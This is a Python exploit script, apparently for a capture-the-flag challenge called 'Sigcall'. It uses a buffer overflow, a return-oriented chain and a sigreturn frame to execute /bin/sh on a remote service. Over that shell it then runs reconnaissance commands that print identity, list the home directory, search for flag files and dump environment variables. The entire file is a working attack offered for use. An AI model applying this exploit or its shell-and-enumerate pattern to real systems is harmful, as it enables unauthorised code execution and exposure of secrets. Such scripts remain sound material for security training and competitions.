#!/usr/bin/env python3
"""Sigcall - SROP + reconocimiento dentro del contenedor (usuario ctf)."""
import socket
import struct
import time

from pwn import SigreturnFrame, context

context.clear(arch="amd64", os="linux")
HOST, PORT = "<host>", 28807
p64 = lambda x: struct.pack("<Q", x)
u64 = lambda b: struct.unpack("<Q", b.ljust(8, b"\x00"))[0]

POP_R9, POP_RDI, WRITE_QWORD = 0x401178, 0x4011CF, 0x401182
POP_RAX, POP_RSI_R15, POP_RDX_RBP = 0x4011A6, 0x4011CD, 0x4011B0
SYSCALL, OFFSET, BSS = 0x401161, 136, 0x404028


def set_r9(v):  return p64(POP_R9) + p64(v) + p64(0)
def set_rdi(v): return p64(POP_RDI) + p64(v)
def write_q(a, v): return set_r9(v) + set_rdi(a) + p64(WRITE_QWORD) + p64(0)
def set_rax(v): return p64(POP_RAX) + p64(v) + p64(0)


def build():
    p = b"A" * OFFSET
    p += write_q(BSS, u64(b"/bin/sh\x00"))
    p += write_q(BSS + 8, 0)
    p += set_rax(15) + p64(SYSCALL)
    f = SigreturnFrame()
    f.rax, f.rdi, f.rsi, f.rdx = 59, BSS, BSS + 8, 0
    f.rip, f.rsp = SYSCALL, 0x404800
    return p + bytes(f)


def shell_cmd(cmds, wait=2.5):
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(3)
    s.recv(4096)
    s.sendall(build())
    time.sleep(0.8)
    out = b""
    for c in cmds:
        s.sendall(c + b"\n")
        time.sleep(wait)
        while True:
            try:
                d = s.recv(65536)
                if not d:
                    break
                out += d
            except socket.timeout:
                break
    s.close()
    return out


if __name__ == "__main__":
    cmds = [
        b"echo ===PWD===; pwd; id",
        b"echo ===HOMEDIR===; ls -la /home/ctf",
        b"echo ===FIND===; find / -maxdepth 4 -iname '*flag*' 2>/dev/null",
        b"echo ===ENV===; env",
    ]
    print(shell_cmd(cmds).decode("utf-8", "replace"))
